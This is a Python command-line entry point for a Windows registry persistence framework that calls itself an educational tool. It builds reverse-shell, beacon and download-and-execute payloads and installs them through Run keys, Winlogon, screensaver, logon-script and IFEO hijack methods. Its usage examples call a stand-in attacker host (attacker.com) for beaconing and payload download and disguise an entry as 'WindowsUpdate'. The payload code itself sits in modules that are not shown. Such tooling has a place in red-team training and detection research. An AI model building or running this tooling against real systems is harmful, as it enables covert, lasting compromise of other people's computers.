#!/usr/bin/env python3
"""
Registry Persistence Framework - Main CLI Entry Point
Educational tool for demonstrating Windows persistence techniques
"""

import sys
import argparse
from core.orchestrator import RegistryPersistenceOrchestrator


def main():
    """Main CLI entry point"""
    
    parser = argparse.ArgumentParser(
        description="Windows Registry Persistence Framework - Educational Use Only",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Display banner and list methods
  python main.py --list
  
  # Check for existing persistence
  python main.py --check
  
  # Create a reverse shell payload
  python main.py --create-payload reverse_shell --attacker-ip 192.168.1.100 --attacker-port 4444
  
  # Install single persistence method
  python main.py --method run_key --payload C:\\Windows\\Temp\\payload.exe
  
  # Install with custom name
  python main.py --method run_key --payload C:\\payload.exe --name "WindowsUpdate"
  
  # Install multiple methods for redundancy
  python main.py --multi run_key screensaver logon_script --payload C:\\payload.exe
  
  # Install IFEO hijack
  python main.py --method image_file_execution --payload C:\\payload.exe --target-exe notepad.exe
  
  # Install screensaver with custom timeout
  python main.py --method screensaver --payload C:\\payload.exe --timeout 120

Advanced Usage:
  # Create beacon payload
  python main.py --create-payload beacon --beacon-url http://attacker.com/beacon --interval 60
  
  # Create download-execute payload
  python main.py --create-payload download_execute --download-url http://attacker.com/payload.exe
  
  # Install RunOnce (single execution)
  python main.py --method run_once_key --payload C:\\payload.exe
  
  # Install for all users (requires admin)
  python main.py --method run_key_local_machine --payload C:\\payload.exe
        """
    )
    
    # Main actions
    action_group = parser.add_argument_group('Actions')
    action_group.add_argument('--list', action='store_true',
                             help='List all available persistence methods')
    action_group.add_argument('--check', action='store_true',
                             help='Check for existing persistence mechanisms')
    action_group.add_argument('--method', type=str,
                             choices=['run_key', 'run_key_local_machine', 'run_once_key',
                                     'winlogon_userinit', 'winlogon_shell', 'screensaver',
                                     'logon_script', 'logon_script_powershell', 'image_file_execution'],
                             help='Persistence method to install')
    action_group.add_argument('--multi', nargs='+',
                             help='Install multiple methods (space-separated)')
    
    # Payload options
    payload_group = parser.add_argument_group('Payload Options')
    payload_group.add_argument('--payload', type=str,
                              help='Path to payload executable/script')
    payload_group.add_argument('--create-payload', type=str,
                              choices=['reverse_shell', 'beacon', 'download_execute', 'batch', 'custom'],
                              help='Create a payload')
    
    # Payload creation parameters
    creation_group = parser.add_argument_group('Payload Creation Parameters')
    creation_group.add_argument('--attacker-ip', type=str,
                               help='Attacker IP for reverse shell')
    creation_group.add_argument('--attacker-port', type=int, default=4444,
                               help='Attacker port (default: 4444)')
    creation_group.add_argument('--beacon-url', type=str,
                               help='Beacon URL for beacon payload')
    creation_group.add_argument('--interval', type=int, default=60,
                               help='Beacon interval in seconds (default: 60)')
    creation_group.add_argument('--download-url', type=str,
                               help='URL to download from (download_execute payload)')
    creation_group.add_argument('--command', type=str,
                               help='Command for batch payload')
    creation_group.add_argument('--powershell-code', type=str,
                               help='Custom PowerShell code')
    
    # Method-specific options
    method_group = parser.add_argument_group('Method-Specific Options')
    method_group.add_argument('--name', type=str,
                             help='Custom registry value name (for run keys)')
    method_group.add_argument('--target-exe', type=str,
                             help='Target executable for IFEO hijack (e.g., notepad.exe)')
    method_group.add_argument('--timeout', type=int, default=60,
                             help='Screensaver timeout in seconds (default: 60)')
    
    # Output options
    output_group = parser.add_argument_group('Output Options')
    output_group.add_argument('--no-banner', action='store_true',
                             help='Suppress banner display')
    output_group.add_argument('--verbose', action='store_true',
                             help='Verbose output')
    
    args = parser.parse_args()
    
    # Initialize orchestrator
    orchestrator = RegistryPersistenceOrchestrator()
    
    # Display banner unless suppressed
    if not args.no_banner:
        orchestrator.display_banner()
    
    # Handle different operations
    if args.list:
        orchestrator.list_methods()
        return 0
    
    elif args.check:
        orchestrator.check_existing_persistence()
        return 0
    
    elif args.create_payload:
        payload_type = args.create_payload
        kwargs = {}
        
        if payload_type == 'reverse_shell':
            if not args.attacker_ip:
                print("[!] --attacker-ip is required for reverse shell payload")
                return 1
            kwargs['attacker_ip'] = args.attacker_ip
            kwargs['attacker_port'] = args.attacker_port
        
        elif payload_type == 'beacon':
            if not args.beacon_url:
                print("[!] --beacon-url is required for beacon payload")
                return 1
            kwargs['beacon_url'] = args.beacon_url
            kwargs['interval'] = args.interval
        
        elif payload_type == 'download_execute':
            if not args.download_url:
                print("[!] --download-url is required for download_execute payload")
                return 1
            kwargs['download_url'] = args.download_url
        
        elif payload_type == 'batch':
            if not args.command:
                print("[!] --command is required for batch payload")
                return 1
            kwargs['command'] = args.command
        
        elif payload_type == 'custom':
            if not args.powershell_code:
                print("[!] --powershell-code is required for custom payload")
                return 1
            kwargs['powershell_code'] = args.powershell_code
        
        payload_path = orchestrator.create_payload(payload_type, **kwargs)
        
        if payload_path:
            print(f"\n[*] Payload created successfully!")
            print(f"[*] Use it with: python main.py --method <METHOD> --payload {payload_path}")
        
        return 0 if payload_path else 1
    
    elif args.multi:
        if not args.payload:
            print("[!] --payload is required for multi-method installation")
            return 1
        
        orchestrator.install_multiple(args.multi, args.payload)
        return 0
    
    elif args.method:
        if not args.payload:
            print("[!] --payload is required for method installation")
            return 1
        
        # Prepare kwargs
        kwargs = {}
        if args.name:
            kwargs['name'] = args.name
        if args.target_exe:
            kwargs['target_exe'] = args.target_exe
        if args.timeout:
            kwargs['timeout'] = args.timeout
        
        # Install method
        result = orchestrator.install_method(args.method, args.payload, **kwargs)
        
        if result:
            print("\n[+] Installation successful!")
            
            # Generate removal script
            orchestrator.generate_removal_script()
            
            return 0
        else:
            print("\n[-] Installation failed")
            return 1
    
    else:
        # No action specified, show help
        parser.print_help()
        return 0


if __name__ == "__main__":
    try:
        sys.exit(main())
    except KeyboardInterrupt:
        print("\n\n[!] Interrupted by user")
        sys.exit(1)
    except Exception as e:
        print(f"\n[!] Error: {e}")
        if '--verbose' in sys.argv:
            import traceback
            traceback.print_exc()
        sys.exit(1)